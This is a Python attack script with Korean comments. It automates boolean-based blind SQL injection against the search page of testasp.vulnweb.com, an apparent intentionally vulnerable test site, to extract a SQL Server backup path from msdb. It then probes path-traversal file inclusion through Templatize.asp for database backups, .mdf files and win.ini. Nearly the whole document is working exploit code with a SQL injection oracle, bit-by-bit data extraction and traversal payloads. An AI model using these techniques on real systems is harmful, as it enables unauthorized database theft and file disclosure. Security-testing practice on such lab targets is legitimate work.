#!/usr/bin/env python3
"""Round 10b — C 단계 재실행.
수정 2건: ① URL 의 공백/역슬래시를 quote() 로 전부 인코딩(이전엔 0/160 = curl 단계 실패)
          ② 상한 90자에서 잘린 physical_device_name 의 꼬리를 이어 추출.
백업 파일은 **실존 여부만** 확인하고 내용은 읽지 않는다(카드정보 포함 가능).
"""
import json, urllib.parse, urllib.request, urllib.error

SEARCH = "http://testasp.vulnweb.com/search.asp"
TMPL = "http://testasp.vulnweb.com/Templatize.asp"
REQ = {"n": 0}


def _get(url):
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return r.status, r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:
        return 0, f"EXC:{e}"


def oracle(cond):
    st = "zzq')>0 OR (" + cond + "))--"
    code, body = _get(SEARCH + "?tfSearch=" + urllib.parse.quote(st, safe=""))
    if code == 500:
        return None
    return "class='posttext'" in body


def exact_int(expr, lo=0, hi=200000):
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract_range(expr, a, b):
    out = ""
    for i in range(a, b + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>", True
        if lo <= 1:
            return out, False
        out += chr(lo)
    return out, False


def lfi_probe(abs_path, label):
    """절대경로 → ..%2f×2 기준 상대경로 (웹루트 = C:\\ 아래 2단계) → Templatize"""
    q = abs_path.strip().replace("\\", "/")
    if len(q) > 1 and q[1] == ":":
        q = q[3:]
    item = "..%2f..%2f" + q.lstrip("/")
    url = TMPL + "?item=" + urllib.parse.quote(item, safe="")
    code, body = _get(url)
    ok = code == 200 and len(body) > 1300
    print(f"  [{'★도달' if ok else '   -  '}] {label}\n        {item}\n        → {code} size={len(body)}")
    return {"label": label, "path": abs_path, "item": item, "code": code,
            "size": len(body), "reachable": ok}


R = {}
EXP = "(SELECT MIN(physical_device_name) FROM msdb.dbo.backupmediafamily)"
print("### 1. 잘린 백업 경로의 꼬리 이어붙이기")
total = exact_int(f"LEN({EXP})", 0, 400)
print(f"  전체 길이 = {total} (앞 90자는 이미 확보)")
head = ("C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio\\acublog_1apr")
tail, _ = extract_range(EXP, len(head) + 1, min(total or 0, len(head) + 80))
full = head + tail
R["physical_device_name"] = full
print(f"  이어붙인 꼬리 = {tail!r}")
print(f"  → 전체 경로 = {full!r}")

print("\n### 2. 백업 디렉터리 추정")
d = full.rsplit("\\", 1)[0] if "\\" in full else ""
R["backup_dir"] = d
print(f"  백업 디렉터리 = {d!r}")

print("\n### 3. ★ LFI 도달 검증 (공백/역슬래시 전부 인코딩)")
R["lfi"] = []
R["lfi"].append(lfi_probe(full, "발견한 백업 파일(원문)"))
base = full.rsplit("\\", 1)[-1] if "\\" in full else full
for dbname in ["acuforum", "acuservice", "acublog", "master"]:
    cand = base
    for token in ["acublog", "acuforum", "acuservice", "master"]:
        if token in cand:
            cand = cand.replace(token, dbname)
            break
    R["lfi"].append(lfi_probe(d + "\\" + cand, f"패턴 추정: {cand}"))

print("\n### 4. SQL 데이터 디렉터리의 DB 파일 실존 여부 (내용은 읽지 않음)")
for f in ["acuforum.mdf", "acuforum_log.LDF", "acublog.mdf", "acuservice.mdf", "master.mdf"]:
    R["lfi"].append(lfi_probe(
        "C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\" + f, f"DATA\\{f}"))

print("\n### 5. 대조군 — 실존이 확인된 파일이 같은 방식으로 200 이 나오는지 (오라클 검증)")
R["lfi"].append(lfi_probe("C:\\Windows\\win.ini", "대조군 C:\\Windows\\win.ini (200 기대)"))

R["requests"] = REQ["n"]
with open("out/backup_paths2.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"\n### 완료 — 총 요청 {REQ['n']}건 → out/backup_paths2.json")
